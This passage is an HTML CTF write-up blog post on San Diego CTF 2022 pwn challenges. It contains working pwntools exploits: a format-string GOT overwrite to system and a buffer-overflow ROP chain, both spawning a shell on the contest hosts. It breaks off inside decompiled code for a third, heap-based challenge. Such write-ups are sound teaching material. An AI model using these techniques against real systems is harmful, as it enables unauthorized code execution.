@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CTF : https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1356  I played this CTF with Project Sekai and it was really great. We came 5th in the CTF.   Oil Spill Description : Darn, these oil spills are going crazy nowadays.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="San Diego CTF 2022">
+<meta property="og:url" content="http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/index.html">
+<meta property="og:site_name" content="4n0nym4u5">
+<meta property="og:description" content="CTF : https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1356  I played this CTF with Project Sekai and it was really great. We came 5th in the CTF.   Oil Spill Description : Darn, these oil spills are going crazy nowadays.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/7Uwtq3R.png">
+<meta property="og:image" content="https://i.imgur.com/ZLcnejq.png">
+<meta property="og:image" content="https://i.imgur.com/xMwBnvr.png">
+<meta property="og:image" content="https://i.imgur.com/3LLohQZ.png">
+<meta property="og:image" content="https://i.imgur.com/lRAqXfM.png">
+<meta property="og:image" content="https://i.imgur.com/4ugL9pr.png">
+<meta property="og:image" content="https://i.imgur.com/OvHja3m.png">
+<meta property="og:image" content="https://i.imgur.com/Z5WIokP.png">
+<meta property="og:image" content="https://i.imgur.com/TZHR9di.png">
+<meta property="og:image" content="https://i.imgur.com/bfNf1Li.jpg">
+<meta property="og:image" content="https://i.imgur.com/qOB9Hom.png">
+<meta property="og:image" content="https://i.imgur.com/iGJLhst.png">
+<meta property="og:image" content="https://i.imgur.com/0TuhK8w.png">
+<meta property="og:image" content="https://i.imgur.com/zXILsbo.png">
+<meta property="article:published_time" content="2022-05-10T10:42:00.000Z">
+<meta property="article:modified_time" content="2023-02-01T17:27:24.934Z">
+<meta property="article:author" content="4n0nym4u5">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="fmt">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="mips">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/7Uwtq3R.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>San Diego CTF 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/25/Imaginary%20CTF%202022/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/14/CArot/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&text=San Diego CTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&is_video=false&description=San Diego CTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=San Diego CTF 2022&body=Check out this article: http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&name=San Diego CTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&t=San Diego CTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oil-Spill"><span class="toc-number">1.</span> <span class="toc-text">Oil Spill</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">1.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Horoscope"><span class="toc-number">2.</span> <span class="toc-text">Horoscope</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-1"><span class="toc-number">2.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-1"><span class="toc-number">2.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breakfast-Menu"><span class="toc-number">3.</span> <span class="toc-text">Breakfast-Menu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-2"><span class="toc-number">3.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-2"><span class="toc-number">3.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-2"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secure-Horoscope"><span class="toc-number">4.</span> <span class="toc-text">Secure Horoscope</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-3"><span class="toc-number">4.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-3"><span class="toc-number">4.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-3"><span class="toc-number">4.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        San Diego CTF 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">4n0nym4u5</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-10T10:42:00.000Z" itemprop="datePublished">2022-05-10</time>
+        
+        (Updated: <time datetime="2023-02-01T17:27:24.934Z" itemprop="dateModified">2023-02-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fmt/" rel="tag">fmt</a>, <a class="tag-link-link" href="/tags/mips/" rel="tag">mips</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/shellcode/" rel="tag">shellcode</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>CTF : <a target="_blank" rel="noopener" href="https://ctftime.org/event/1356">https://ctftime.org/event/1356</a></p>
+</blockquote>
+<p>I played this CTF with <strong><a target="_blank" rel="noopener" href="https://ctftime.org/team/169557">Project Sekai</a></strong> and it was really great. We came 5th in the CTF.</p>
+<p><img src="https://i.imgur.com/7Uwtq3R.png"></p>
+<hr>
+<h2 id="Oil-Spill"><a href="#Oil-Spill" class="headerlink" title="Oil Spill"></a>Oil Spill</h2><blockquote>
+<p><strong>Description</strong> : Darn, these oil spills are going crazy nowadays. It looks like there’s a little bit more than oil coming out of this program though…<br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill">chall</a><br><strong>Docker File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972245690707214346/Dockerfile">Dockerfile</a><br><strong>Solves</strong> : 73<br><strong>Points</strong> : 200</p>
+</blockquote>
+<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3ff000)</span></span><br><span class="line"><span class="attr">RUNPATH:</span>  <span class="string">&#x27;./&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><img src="https://i.imgur.com/ZLcnejq.png"></p>
+<p>The main function leaks the address of <code>puts</code>, <code>printf</code>, <code>our_input</code>, and <code>temp</code>. So we have libc address leak, stack leak which isn’t required and PIE leak which is not required as well.<br>The <code>temp</code> is just a useless function which is never called in the binary. </p>
+<p>The main function takes 300 bytes from stdin and  stores it in our_input. And then it is being printed back to the stdout using <code>printf</code> without any format specifiers on our_input. So we have a <strong>format string bug</strong> here. We control the first parameter to the <code>printf</code> function so we can use it to leak arbitrary data using <code>%p</code>, <code>%s</code>, <code>%x</code> and so many. And we can also write arbitrary data to memory using the <code>%n</code> specifier.  We can use that for our advantage. </p>
+<p>At the end the main function gives a calls to <code>puts</code> with <code>x</code> as the argument. <code>x</code> is a global variable in the bss segment. So it is both readable and writable. </p>
+<p><img src="https://i.imgur.com/xMwBnvr.png"></p>
+<p><img src="https://i.imgur.com/3LLohQZ.png"></p>
+<p>As per the docs the <code>xinfo</code> command </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shows offsets of the specified address to useful other locations</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul>
+<li>First use the leaks from the main function to determine the libc base address.</li>
+<li>Since the binary uses <span style="color:green">Partial Relro</span>.<br>use the fmt bug to overwrite the got of <code>puts</code> function to <code>system</code> address and at the same time overwrite the <code>x</code> global variable to “&#x2F;bin&#x2F;sh”. </li>
+<li>Get shell</li>
+</ul>
+<figure class="highlight python"><figcaption><span>expl.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">exe  = context.binary = ELF(<span class="string">&#x27;./OilSpill&#x27;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&#x27;oil.sdc.tf&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">libc=SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">leaks=GetInt(rl())</span><br><span class="line">libc.address = leaks[<span class="number">0</span>]-libc.sym.puts</span><br><span class="line">re()</span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;exe.got.puts : libc.sym.system, <span class="number">0x600c80</span> : <span class="string">b&quot;/bin/sh\x00&quot;</span>&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">lb()</span><br><span class="line">pause()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Horoscope"><a href="#Horoscope" class="headerlink" title="Horoscope"></a>Horoscope</h2><blockquote>
+<p><strong>Description</strong> : This program will predict your future! <br><br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972246124742180924/horoscope">chall</a> <br><br><strong>Solves</strong> : 125 <br><br><strong>Points</strong> : 100 <br></p>
+</blockquote>
+<h3 id="Checksec-1"><a href="#Checksec-1" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p><img src="https://i.imgur.com/lRAqXfM.png"></p>
+<p>The main function takes an input of 320 bytes from stdin to <code>our_input</code>. <code>our_input</code> is a character array of 48 bytes. So the bug here is buffer overflow. </p>
+<p>And then our input is passed as an parameter to <code>processInput</code> function. </p>
+<p><img src="https://i.imgur.com/4ugL9pr.png"></p>
+<p>So we have to pass default case and return from the function to trigger the buffer overflow vulnerability and hijack the RIP. We can easily do this by prepending <code>1/1/1/1/</code> before the padding. Lets check some other functions in the binary.</p>
+<p>There is a <code>test</code> and a <code>debug</code> function in the binary which are never called.</p>
+<p><img src="https://i.imgur.com/OvHja3m.png"></p>
+<p><img src="https://i.imgur.com/Z5WIokP.png"></p>
+<p>Here the <code>temp</code> is just a global variable and it is initially 0 when the binary is running. We can set it to 1 by calling the <code>debug</code> function and then call the <code>test</code> function in our rop chain to execute <code>system(&quot;/bin/sh&quot;);</code> </p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><ul>
+<li>Begin the payload with <code>1/1/1/1/</code> to return from the <code>processInput</code> function.</li>
+<li>48 bytes of padding to overflow the stack and reach RIP.</li>
+<li>call the <code>test</code> function to set <code>temp</code> variable to 1.</li>
+<li>call the debug function to execute <code>system(&quot;/bin/sh&quot;);</code></li>
+<li>Get shell.</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">exe  = context.binary = ELF(<span class="string">&#x27;./horoscope&#x27;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&#x27;horoscope.sdc.tf&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">libc=SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;1/1/1/1/&quot;</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">48</span> + p(exe.sym.debug) + p(exe.sym.test)</span><br><span class="line"></span><br><span class="line">re()</span><br><span class="line">sl(padding)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Breakfast-Menu"><a href="#Breakfast-Menu" class="headerlink" title="Breakfast-Menu"></a>Breakfast-Menu</h2><blockquote>
+<p><strong>Description</strong> : I’m awfully hungry, with all these options to choose from, what should I order? <br><br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972248049038544926/BreakfastMenu">chall</a> <br><br><strong>Docker File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972248478430404608/Dockerfile">DockerFile</a> <br><br><strong>Solves</strong> : 32 <br><br><strong>Points</strong> : 250 <br></p>
+</blockquote>
+<h3 id="Checksec-2"><a href="#Checksec-2" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3ff000)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview-2"><a href="#Overview-2" class="headerlink" title="Overview"></a>Overview</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> ** argv,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> ** envp)</span> &#123;</span><br><span class="line">    <span class="type">int</span> OPTION; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">    <span class="type">int</span> GLOBAL_IDX; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the SDCTF cafe!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">&quot;This restaurant works a little different than normal ones. First, tell us if you want to make a new order, then you &quot;</span></span><br><span class="line">        <span class="string">&quot;can change or delete orders.\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    GLOBAL_IDX = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1. Create a new order\n2. Edit an order\n3. Delete an order\n4. Pay your bill and leave&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp; OPTION);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> (OPTION == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;which order would you like to modify&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp; OPTION);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span> (GLOBAL_IDX &lt;= OPTION)</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;We have eggs, cereal, waffles and french toast. \nWhat would you like to order?&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">if</span> (fgets(buf, <span class="number">64</span>, <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;so you wanted %s&quot;</span>, buf);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">strcpy</span>(orders[OPTION], buf);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (OPTION &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (OPTION != <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (OPTION == <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;thanks for coming!&quot;</span>);</span><br><span class="line">                    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                LABEL_21:</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;which order would you like to remove&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp; OPTION);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span> (GLOBAL_IDX &lt;= OPTION) &#123;</span><br><span class="line">                INVALID: <span class="built_in">puts</span>(<span class="string">&quot;Order doesn&#x27;t exist!!!&quot;</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">free</span>(orders[OPTION]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (OPTION != <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            